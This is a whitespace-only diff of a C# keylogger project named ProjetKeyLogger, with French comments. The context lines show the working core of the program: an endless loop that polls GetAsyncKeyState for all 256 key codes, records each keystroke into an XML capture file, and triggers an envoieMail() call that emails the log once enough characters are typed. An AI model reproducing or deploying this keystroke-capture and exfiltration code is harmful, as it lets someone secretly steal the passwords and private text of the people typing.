@@ -41,7 +41,6 @@ namespace ProjetKeyLogger
 
             //Chemin pour enregistrer le fichier XML
             file_path = "Capture.xml";
-
         }
 
         //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
@@ -49,8 +48,7 @@ namespace ProjetKeyLogger
         // l'argument est une "virtual key code " car chaque action est asscoiée à une clé
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(int cle);
-
-        
+                
         public void capture()
         {
             //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
@@ -66,15 +64,12 @@ namespace ProjetKeyLogger
 
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
-
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                 Thread.Sleep(sleep_time); //nombre en miliseconde
 
                 //verification de l'état de chaque touche (up ou down)
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
-                    
-
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                     if (statut_cle == 32769)
@@ -159,7 +154,6 @@ namespace ProjetKeyLogger
                                         {
                                             valeurs = "0123456789";
                                             enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 48, 1));
-
                                         }
                                     }
                                 }
@@ -184,7 +178,6 @@ namespace ProjetKeyLogger
                                 {
                                     valeurs = "0123456789";
                                     enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 96, 1));
-
                                 }
                                 break;
 
@@ -322,7 +315,6 @@ namespace ProjetKeyLogger
                             case 255:
                                 break;
 
-
                             default:
                                 if (ctrl == true)
                                 {
@@ -331,7 +323,6 @@ namespace ProjetKeyLogger
                                 {
                                     if (majuscule == true | shift == true)
                                     {
-                                        
                                         enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII).ToString());
                                         shift = false;
                                     }
@@ -343,7 +334,6 @@ namespace ProjetKeyLogger
                                
                                 break;
                         }
-
                         nb_caractere_tape += 1;
                     }
 
@@ -373,9 +363,7 @@ namespace ProjetKeyLogger
                         //envoie du mail
                         envoieMail();
                     }
-                    
-                }
-                                
+                }            
             }
         }
 
